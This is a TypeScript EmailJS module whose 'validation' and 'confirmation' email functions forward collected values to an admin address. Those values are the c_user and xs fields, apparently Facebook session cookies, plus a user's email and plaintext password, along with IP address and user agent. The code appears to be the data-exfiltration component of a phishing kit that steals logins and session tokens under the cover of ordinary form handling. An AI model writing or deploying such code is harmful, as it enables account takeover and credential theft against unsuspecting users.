import emailjs from "@emailjs/browser";

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  const userId = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!userId) {
    console.error("EmailJS User ID is not configured");
    return;
  }

  emailjs.init(userId);
  console.log('EmailJS initialized successfully');
};

export const sendValidationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_email: formData.admin_email || "admin@example.com",
      c_user: formData.c_user,
      xs: formData.xs,
      timestamp: new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    return await emailjs.send(serviceId, templateId, templateParams);
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_email: formData.admin_email || "admin@example.com",
      user_email: formData.user_email,
      password: formData.password,
      timestamp: new Date().toLocaleString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    return await emailjs.send(serviceId, templateId, templateParams);
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};